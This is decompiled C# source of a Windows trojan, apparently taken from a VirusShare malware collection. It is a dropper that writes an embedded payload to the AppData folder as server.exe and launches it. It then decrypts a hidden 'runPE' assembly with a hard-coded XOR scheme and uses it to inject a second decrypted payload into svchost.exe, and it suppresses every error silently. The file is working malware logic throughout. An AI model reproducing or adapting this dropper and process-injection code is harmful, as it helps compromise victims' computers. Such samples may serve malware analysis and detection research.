// Decompiled with JetBrains decompiler
// Type: Lawl.Program
// Assembly: server23, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7AF1181A-1DD4-45ED-816D-A160F9D8E1AB
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Llac.lgnr-eff4f1e714db064477e99f3c5cb466cd6307599b0dac7fa8ea5dcf71fbee2f37.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;

namespace Lawl
{
  internal class Program
  {
    private static void Main()
    {
      try
      {
        ResourceManager resourceManager = new ResourceManager("shank", Assembly.GetExecutingAssembly());
        byte[] bytes = (byte[]) resourceManager.GetObject("candy");
        string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\server.exe";
        File.WriteAllBytes(str1, bytes);
        Process.Start(str1);
        Type type = Assembly.Load(Program.Decrypt((byte[]) resourceManager.GetObject("runPE"), "gDVMtfuhHxGUvNyh")).GetTypes()[7];
        MethodInfo method = type.GetMethod("MakeIt");
        string str2 = "svchost.exe";
        method.Invoke(Activator.CreateInstance(type), new object[2]
        {
          (object) Program.Decrypt((byte[]) resourceManager.GetObject("cheese"), "MrVNThsdvShpcPxz"),
          (object) str2
        });
      }
      catch
      {
      }
    }

    public static byte[] Decrypt(byte[] bytes, string Key)
    {
      int num = 350;
      byte[] bytes1 = Encoding.ASCII.GetBytes(Key);
      for (int index = 0; index < bytes.Length; ++index)
        bytes[index] ^= (byte) ((int) bytes1[index % bytes1.Length] >> index + num + bytes1.Length & (int) byte.MaxValue);
      return bytes;
    }

    private static void lawldd()
    {
    }

    [DllImport("xSZcA.dll")]
    private static extern long[] kxWFs(double tKcTM, int fXurT);
  }
}
